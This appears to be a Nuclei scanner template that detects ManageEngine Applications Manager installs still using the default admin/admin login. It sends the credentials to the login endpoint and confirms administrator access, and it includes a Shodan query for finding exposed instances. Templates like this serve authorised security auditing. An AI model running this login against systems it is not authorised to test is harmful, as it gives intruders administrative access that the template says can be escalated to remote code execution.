http:
- raw:
  - 'GET /index.do HTTP/1.1

    Host: {{Hostname}}

    '
- raw:
  - 'POST /j_security_check HTTP/1.1

    Host: {{Hostname}}

    Origin: {{RootURL}}

    Content-Type: application/x-www-form-urlencoded

    Referer: {{RootURL}}/index.do


    clienttype=html&webstart=&j_username=admin&ScreenWidth=1280&ScreenHeight=709&username={{username}}&j_password={{password}}

    '
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - Super Administrator
    - Add Application
  matchers-condition: and
  raw:
  - 'GET /showresource.do?group=All&method=showResourceTypes&monitor_viewtype=categoryview
    HTTP/1.1

    Host: {{Hostname}}

    Referer: {{RootURL}}/j_security_check

    '
id: app-manager-default-login
info:
  author: 0midC13
  description: 'Default credentials grants administrative access to ManageEngine Applications
    Manager, which can be later escalated into a RCE via DB queries.

    '
  metadata:
    max-request: 1
    shodan-query: title:"Applications Manager Login Screen"
    verified: true
  name: ManageEngine Applications Manager - Default Credentials
  reference:
  - https://www.manageengine.com/products/applications_manager/
  severity: high
  tags: default-login,manageengine,zoho,vuln
variables:
  password: admin
  username: admin
